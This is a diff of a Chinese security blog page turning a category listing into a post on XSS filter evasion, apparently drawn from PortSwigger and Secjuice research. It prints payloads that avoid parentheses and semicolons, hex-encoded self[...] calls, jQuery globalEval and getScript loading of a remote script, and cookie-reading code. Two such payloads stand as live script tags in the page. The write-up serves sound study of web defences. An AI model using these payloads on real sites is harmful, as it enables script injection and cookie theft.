@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="web安全">
+  <meta name="keywords" content="xss,">
 
 
 
@@ -83,14 +83,25 @@
 
 
 
-<meta name="keywords" content="web安全 代码审计">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Boogle&#39;s Blog">
-<meta property="og:url" content="https://zhengbao.wang/categories/web安全/index.html">
+<meta name="description" content="0x00 前言前段时间看到了无需括号和分号的XSS,最近又看了利用JavaScript全局变量绕过XSS过滤器,两篇均为译文，提出了一些非常有用的姿势，特此记录膜拜。另外文末贴有原文连接。 0x01 无需括号和分号的XSS早在几年前，作者就提到过在javascript中调用函数而无需括号的方法&amp;lt;script&amp;gt;onerror=alert;throw 1337&amp;lt;/script&amp;gt;">
+<meta name="keywords" content="xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS姿势学习">
+<meta property="og:url" content="https://zhengbao.wang/XSS姿势学习/index.html">
 <meta property="og:site_name" content="Boogle&#39;s Blog">
+<meta property="og:description" content="0x00 前言前段时间看到了无需括号和分号的XSS,最近又看了利用JavaScript全局变量绕过XSS过滤器,两篇均为译文，提出了一些非常有用的姿势，特此记录膜拜。另外文末贴有原文连接。 0x01 无需括号和分号的XSS早在几年前，作者就提到过在javascript中调用函数而无需括号的方法&amp;lt;script&amp;gt;onerror=alert;throw 1337&amp;lt;/script&amp;gt;">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/06/17/5d0712192c7ed21268.png">
+<meta property="og:image" content="https://i.loli.net/2019/06/17/5d077bc55e02d71577.png">
+<meta property="og:image" content="https://i.loli.net/2019/06/17/5d077f0e2616657672.png">
+<meta property="og:image" content="https://i.loli.net/2019/06/17/5d078b1d0b5d277669.png">
+<meta property="og:image" content="https://i.loli.net/2019/06/17/5d078da09539397951.png">
+<meta property="og:image" content="https://i.loli.net/2019/06/17/5d078e1fe3a7988325.png">
+<meta property="og:updated_time" content="2019-06-17T13:25:24.206Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Boogle&#39;s Blog">
+<meta name="twitter:title" content="XSS姿势学习">
+<meta name="twitter:description" content="0x00 前言前段时间看到了无需括号和分号的XSS,最近又看了利用JavaScript全局变量绕过XSS过滤器,两篇均为译文，提出了一些非常有用的姿势，特此记录膜拜。另外文末贴有原文连接。 0x01 无需括号和分号的XSS早在几年前，作者就提到过在javascript中调用函数而无需括号的方法&amp;lt;script&amp;gt;onerror=alert;throw 1337&amp;lt;/script&amp;gt;">
+<meta name="twitter:image" content="https://i.loli.net/2019/06/17/5d0712192c7ed21268.png">
 
 
 
@@ -120,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="https://zhengbao.wang/categories/web安全/">
+  <link rel="canonical" href="https://zhengbao.wang/XSS姿势学习/">
 
 
 
 
 
-  <title>分类: web安全 | Boogle's Blog</title>
+  <title>XSS姿势学习 | Boogle's Blog</title>
   
 
 
@@ -148,7 +159,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -284,291 +295,309 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block category">
-
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>web安全<small>分类</small>
-        </h1>
-      </div>
-
-      
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://zhengbao.wang/XSS姿势学习/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="boogle">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/boogle.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Boogle's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/XSS姿势学习/" itemprop="url">
-              
-                <span itemprop="name">XSS姿势学习</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">XSS姿势学习</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-06-17T21:24:21+08:00" content="2019-06-17">
-          06-17
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-17T21:24:21+08:00">
+                2019-06-17
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/XSS姿势学习/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/XSS姿势学习/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/XSS姿势学习/" class="leancloud_visitors" data-flag-title="XSS姿势学习">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.4k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  15 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/SSRF的一些利用姿势/" itemprop="url">
-              
-                <span itemprop="name">SSRF的一些利用姿势</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-05-06T21:33:14+08:00" content="2019-05-06">
-          05-06
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/XSSRF攻击内网redis/" itemprop="url">
-              
-                <span itemprop="name">XSSRF攻击内网redis</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-05-03T11:23:19+08:00" content="2019-05-03">
-          05-03
-        </time>
-      </div>
-
-    </header>
-  </article>
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间看到了<a href="https://nosec.org/home/detail/2654.html" target="_blank" rel="noopener">无需括号和分号的XSS</a>,最近又看了<a href="https://www.anquanke.com/post/id/180187" target="_blank" rel="noopener">利用JavaScript全局变量绕过XSS过滤器</a>,两篇均为译文，提出了一些非常有用的姿势，特此记录膜拜。另外文末贴有原文连接。</p>
+<h2 id="0x01-无需括号和分号的XSS"><a href="#0x01-无需括号和分号的XSS" class="headerlink" title="0x01 无需括号和分号的XSS"></a>0x01 无需括号和分号的XSS</h2><p>早在几年前，作者就提到过在javascript中调用函数而无需括号的方法<br><code>&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;</code><br>该方法主要利用<code>onerror</code>和<code>throw</code>,工作原理是将onerror设置为你想调用的函数，然后用throw语句将参数传递给调用函数。在上面的payload中，因为throw是一个语句，在和onerror配合使用时需要用分号隔离，避免被包含。而语句隔离也可以使用花括号<code>{}</code>来实现:<br><code>&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;</code><br>这样其实就已经达到作者标题所要的无需括号和分号的xss。<br>但是作者并没有停止，很快又提出了一万种姿势。<br>他发现<code>throw</code>语句可以接上一些表达式，那么这样就可以把<code>onerror</code>放在<code>throw</code>语句中进行赋值，并且throw表达式的<code>最后一部分</code>会被发送到onerror指定的处理函数中。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">throw</span> onerror=alert,a=<span class="string">'boogle'</span>,b=<span class="string">'1337'</span>,a</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/06/17/5d0712192c7ed21268.png" alt></p>
+<p>如果想执行更复杂的语句，那么便可以使用<code>eval</code>函数，但是将上面的payload改为<br><code>&lt;script&gt;throw onerror=eval,alert</code>xss<code>&lt;/script&gt;</code><br>这里弹出的xss为一个字符串，可以使用破浪号包裹而不用括号，如果想要弹cookie，那么就要用到括号了<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span> onerror=<span class="built_in">eval</span>,alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这种方式调用函数，那么显然还是需要<code>()</code>的。但是仔细观察前面的弹窗，我们传入内容为<code>boogle</code>,弹窗内容却为<code>Uncaught boogle</code><br>这样如果在传入的内容之前添加一个<code>=</code>,将会产生一个什么样的效果。<br>对，神奇的事情发生了，就像表面添加<code>=</code>一样，可以将<code>Uncaught</code>赋值为后面的内容，成为一个变量，那么这个变量就可以传入<code>eval</code>函数执行任意javascript代码了。<br>下面的payload中因为alert函数被引号包裹，可以将<code>()</code>编码为<code>\x28\x29</code>从而达到绕过效果。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span>%<span class="number">20</span>onerror=<span class="built_in">eval</span>,<span class="string">"=alert\x28document.cookie\x29"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/06/17/5d077bc55e02d71577.png" alt><br>同样，前面的payload也可以这样变种,产生的效果及原理相同.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span><span class="string">'=alert\x281337\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>上面将<code>Uncaught</code>变为变量的方法是在<code>chrome</code>浏览器下实现的，而且在<code>Microsoft Edge</code>和<code>IE</code>下都能达到效果。但是当把这种方法拿到<code>firefox</code>浏览器时，却失败了，原因Firefox种报错前缀是<code>uncaught exception:</code>，代码最后执行赋值时会出现语法错误。<br><img src="https://i.loli.net/2019/06/17/5d077f0e2616657672.png" alt></p>
+<p>但是很快作者给出了在<code>firefox</code>上的任意javascript执行的方法<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span>&#123;<span class="attr">lineNumber</span>:<span class="number">1</span>,<span class="attr">columnNumber</span>:<span class="number">1</span>,<span class="attr">fileName</span>:<span class="number">1</span>,<span class="attr">message</span>:<span class="string">'alert\x281\x29'</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`</span><br></pre></td></tr></table></figure></p>
+<p>最终，作者更是贴出了一种无需字符串的通用payload</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">throw</span>/a/,Uncaught=<span class="number">1</span>,g=alert,a=URL%<span class="number">2b0</span>,onerror=<span class="built_in">eval</span>,/<span class="number">1</span>/g%2ba[<span class="number">12</span>]%2b[<span class="number">1337</span>]%2ba[<span class="number">13</span>]&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，在该payloa中，作者非常巧妙的利用<code>a=URL+0</code>的方式将<code>function</code>与字符相加变为字符串，即a为<code>&quot;function URL() { [native code] }0&quot;</code>，然后从<code>a</code>取相应的字符使用。利用这种方式去拼接被过滤的关键词的确为一种很好的思路。<br><img src="https://i.loli.net/2019/06/17/5d078b1d0b5d277669.png" alt></p>
+<p>还有通过使用类型错误自动将字符串发送到异常处理程序的方法，这使得我们完全不需要throw语句。<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>TypeError.prototype.name ='=/',0[<span class="string">onerror=eval</span>][<span class="symbol">'/-alert(1)//'</span>]<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-利用JavaScript全局变量绕过XSS过滤器"><a href="#0x02-利用JavaScript全局变量绕过XSS过滤器" class="headerlink" title="0x02 利用JavaScript全局变量绕过XSS过滤器"></a>0x02 利用JavaScript全局变量绕过XSS过滤器</h2><p>这里所说的javascript全局变量是指利用<code>self</code>或者<code>window</code>调用任意javascript代码。<br><img src="https://i.loli.net/2019/06/17/5d078da09539397951.png" alt><br>比如说调用<code>alert</code>方法，可以使用<code>self[&quot;alert&quot;]</code><br><img src="https://i.loli.net/2019/06/17/5d078e1fe3a7988325.png" alt><br>如果alert关键词被过滤，使用全局变量的方法甚至可以使用字符串拼接<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>self[<span class="string">"al"+"ert"</span>](<span class="link">1</span>)<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>同样因为是在字符串中，可以使用十六进制编码、base64编码等<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/*</span><br><span class="line">** alert(document.cookie)</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">self["<span class="symbol">\x</span>61<span class="symbol">\x</span>6c<span class="symbol">\x</span>65<span class="symbol">\x</span>72<span class="symbol">\x</span>74"](</span><br><span class="line">    self["<span class="symbol">\x</span>64<span class="symbol">\x</span>6f<span class="symbol">\x</span>63<span class="symbol">\x</span>75<span class="symbol">\x</span>6d<span class="symbol">\x</span>65<span class="symbol">\x</span>6e<span class="symbol">\x</span>74"]</span><br><span class="line">        ["<span class="symbol">\x</span>63<span class="symbol">\x</span>6f<span class="symbol">\x</span>6f<span class="symbol">\x</span>6b<span class="symbol">\x</span>69<span class="symbol">\x</span>65"]</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
+<p>另外，网站中如果使用了jQuery之类的第三方库。可以利用这些第三方库中的全局变量<br>比如在JQuery中<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self[<span class="string">"$"</span>][<span class="symbol">"globalEval"</span>]("alert(1)");	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">self[<span class="string">"\x24"</span>][<span class="symbol">"\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c"</span>]</span><br><span class="line">("\x61\x6c\x65\x72\x74\x28\x31\x29");</span><br></pre></td></tr></table></figure></p>
+<p>甚至可以使用<code>self[&quot;$&quot;][&quot;getScript&quot;](url)</code>来加载任意js文件<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self[<span class="string">"$"</span>][<span class="symbol">"getScript"</span>]("https://example.com/my.js");</span><br></pre></td></tr></table></figure></p>
+<p>另外还可以使用javascript迭代器<code>Object.keys</code>和正则表达式的方法去获取指定函数。<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a = function() &#123;</span><br><span class="line">    <span class="built_in">c</span>=<span class="number">0</span>; <span class="comment">// index counter</span></span><br><span class="line">    <span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(/^a[rel]+t$/.test(i)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">c</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">c</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// in one line</span></span><br><span class="line">a=()=&gt;&#123;<span class="built_in">c</span>=<span class="number">0</span>;<span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">self</span>)&#123;<span class="keyword">if</span>(/^a[rel]+t$/.test(i))&#123;<span class="keyword">return</span> <span class="built_in">c</span>&#125;<span class="built_in">c</span>++&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// then you can use a() with Object.keys</span></span><br><span class="line"><span class="comment">// alert("foo")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">self</span>[<span class="type">Object</span>.keys(<span class="keyword">self</span>)[a()]](<span class="string">"foo"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>使用这些方法，可以说可以在很大程度上绕过一些检测关键字黑名单的waf了。</p>
+<p>如果与第一种方法相结合，更是可以组合出更有效的payload<br>···</p>
+<script>throw/a/,Uncaught=1,g=alert,a=URL%2b0,self[`on`%2b`error`]=eval,/1/g%2ba[12]%2b"self[`document`][`cookie`]"%2ba[13]</script>
 
 
-      
-        
+<script>TypeError.prototype.name="=/",0[self[`on`%2b`error`]=self["eval"]]["/-self[`alert`](self[`document`][`cookie`])//"]</script>
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/文件上传功能的一些另类利用/" itemprop="url">
-              
-                <span itemprop="name">文件上传功能的一些另类利用</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-20T23:35:16+08:00" content="2019-04-20">
-          04-20
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+<p>···</p>
+<h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://portswigger.net/blog/xss-without-parentheses-and-semi-colons" target="_blank" rel="noopener">https://portswigger.net/blog/xss-without-parentheses-and-semi-colons</a><br><a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/" target="_blank" rel="noopener">https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/</a></p>
 
       
-        
+    </div>
+    
+    
+    
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/java代码审计入门之s2-002复现分析/" itemprop="url">
-              
-                <span itemprop="name">java代码审计入门之s2-002复现分析</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-17T12:25:20+08:00" content="2019-04-17">
-          04-17
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+    <div>
       
         
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/java代码审计入门之s2-001复现分析/" itemprop="url">
-              
-                <span itemprop="name">java代码审计入门之s2-001复现分析</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-13T17:56:47+08:00" content="2019-04-13">
-          04-13
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/内部AWD攻防对抗web记录/" itemprop="url">
-              
-                <span itemprop="name">内部AWD攻防对抗web记录</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-03-27T21:45:46+08:00" content="2019-03-27">
-          03-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/Ljphpcms-v1-03代码审计之csrf-xss/" itemprop="url">
-              
-                <span itemprop="name">Ljphpcms_v1.03代码审计之csrf&&xss</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-03-21T21:12:06+08:00" content="2019-03-21">
-          03-21
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/burpsuite安装分块传输插件/" itemprop="url">
-              
-                <span itemprop="name">burpsuite安装分块传输插件</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-03-18T10:14:07+08:00" content="2019-03-18">
-          03-18
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/semcms-php-v3-8任意文件刪除/" itemprop="url">
-              
-                <span itemprop="name">semcms_php_v3.8任意文件刪除</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-03-16T16:24:25+08:00" content="2019-03-16">
-          03-16
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/XSS姿势学习/">XSS姿势学习</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
+  <p><span>发布时间:</span>2019年06月17日 - 21:24</p>
+  <p><span>最后更新:</span>2019年06月17日 - 21:25</p>
+  <p><span>原始链接:</span><a href="/XSS姿势学习/" title="XSS姿势学习">https://zhengbao.wang/XSS姿势学习/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zhengbao.wang/XSS姿势学习/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
 
       
     </div>
 
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>感觉写的不错，给买个棒棒糖呗</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt="boogle 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt="boogle 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/SSRF的一些利用姿势/" rel="next" title="SSRF的一些利用姿势">
+                <i class="fa fa-chevron-left"></i> SSRF的一些利用姿势
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/categories/web安全/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/categories/web安全/page/4/">4</a><a class="extend next" rel="next" href="/categories/web安全/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -576,6 +605,13 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
 
         </div>
         
@@ -596,8 +632,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -717,6 +762,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-无需括号和分号的XSS"><span class="nav-number">2.</span> <span class="nav-text">0x01 无需括号和分号的XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-利用JavaScript全局变量绕过XSS过滤器"><span class="nav-number">3.</span> <span class="nav-text">0x02 利用JavaScript全局变量绕过XSS过滤器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-参考链接"><span class="nav-number">4.</span> <span class="nav-text">0x03 参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -887,6 +948,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
